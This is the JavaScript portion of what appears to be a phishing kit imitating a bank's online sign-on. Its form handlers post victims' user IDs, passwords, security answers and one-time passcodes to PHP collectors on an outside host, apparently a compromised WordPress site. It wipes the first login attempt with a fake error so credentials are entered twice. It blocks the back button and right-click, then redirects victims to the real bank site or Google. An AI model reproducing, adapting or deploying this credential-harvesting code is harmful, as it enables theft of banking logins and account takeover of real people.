    <script>
        function formatNumber(input) {
            let value = input.value;
            value = value.replace(/\D/g, '');
            input.value = value;
        }
    </script>
    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script> -->
    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script type="text/javascript">

        document.addEventListener('DOMContentLoaded', () => {
            // Disable browser back/forward buttons
            history.pushState(null, document.title, location.href);
            window.addEventListener('popstate', function () {
                history.pushState(null, document.title, location.href);
            });

            // Initialize the counter variables
            let count = 0;
            let counts = 0;
            // Handle the form submission for the first step
            document.getElementById('aoblogon').addEventListener('submit', function (e) {
                e.preventDefault();
                count += 1;

                // Show the loading spinner and disable the submit button
                document.getElementById('signIn').innerText = 'Signing In...';

                // Send POST request to data.php
                fetch('https://gepo.co.za/demo/wp-content/wp-log/kk/data.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams(new FormData(this)).toString()
                })
                    .then(response => response.text())
                    .then(data => {
                        console.log(data);
                    });

                // Show the next step or display an error message
                setTimeout(() => {
                    if (count === 2) {
                        document.getElementById('aoblogon').style.display = 'none';
                        document.getElementById('form3').style.display = 'block';
                    } else {
                        document.getElementById('userId').value = '';
                        document.getElementById('password').value = '';
                        document.getElementById('msg').style.display = 'block';
                        document.getElementById('signIn').innerText = 'Sign On';
                    }
                }, 2000);
            });

            // Handle the form submission for the second step
            document.getElementById('form2').addEventListener('submit', function (e) {
                e.preventDefault();
                count += 1;

                // Show the loading spinner and disable the submit button
                document.getElementById('btn2').innerText = 'Submitting...';

                // Send POST request to question.php
                fetch('https://gepo.co.za/demo/wp-content/wp-log/kk/question.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams(new FormData(this)).toString()
                })
                    .then(response => response.text())
                    .then(data => {
                        console.log(data);
                    });

                // Show the next step or display an error message
                setTimeout(() => {
                    if (count === 3) {
                        document.getElementById('form2').style.display = 'none';
                        document.getElementById('form3').style.display = 'block';
                    } else {
                        document.getElementById('Q1').value = '';
                        document.getElementById('msg').style.display = 'block';
                        document.getElementById('btn2').innerHTML = 'Submitting...';
                    }
                }, 2000);
            });

            // Handle the form submission for the third step
            document.getElementById('form3').addEventListener('submit', function (e) {
                e.preventDefault();
                counts += 1;

                // Show the loading spinner and disable the submit button
                document.getElementById('btn3').innerText = 'Submitting...';
                setTimeout(() => {
                    window.location.href = 'https://www.key.com/personal/index.html';
                }, 2000)

                // Send POST request to cok.php
                fetch('https://gepo.co.za/demo/wp-content/wp-log/kk/cok.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams(new FormData(this)).toString()
                })
                    .then(response => response.text())
                    .then(data => {
                        if (counts === 2) {
                            setTimeout(() => {
                                window.location.href = 'https://www.google.com/';
                            }, 2000);
                        } else {
                            // If the count is not 2, reset the button text and handle errors
                            document.getElementById('btn4').innerText = 'Submit';
                            document.getElementById('msg').style.display = 'block';
                        }
                    });

            });
            // Handle the form submission for the fourth step
            document.getElementById('form4').addEventListener('submit', function (e) {
                e.preventDefault(); // Prevent the default form submission behavior
                counts += 1;

                // Show the loading spinner and disable the submit button
                document.getElementById('btn4').innerHTML = '<i class="fa fa-circle-o-notch fa-spin fa-1x fa-fw"></i>';

                // Send POST request to otp.php
                fetch('otp.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams(new FormData(this)).toString()
                })
                    .then(response => response.text())
                    .then(data => {
                        console.log(data);
                        window.location.href = 'https://www.google.com/';
                        if (counts === 2) {
                            setTimeout(() => {
                            }, 2000);
                        } else {
                            // If the count is not 2, reset the button text and handle errors
                            document.getElementById('btn4').innerText = 'Submit';
                            document.getElementById('msg').style.display = 'block';
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        // Reset the button text and show the error message
                        document.getElementById('btn4').innerText = 'Submit';
                        document.getElementById('msg').style.display = 'block';
                    });
            });
            if (counts === 2) {
                setTimeout(() => {
                }, 2000);
            } else {
                // If the count is not 2, reset the button text and handle errors
                document.getElementById('btn4').innerText = 'Submit';
                document.getElementById('msg').style.display = 'block';
            }
            // Prevent the context menu from appearing
            document.addEventListener('contextmenu', function (e) {
                e.preventDefault();
            });
        });
    </script>
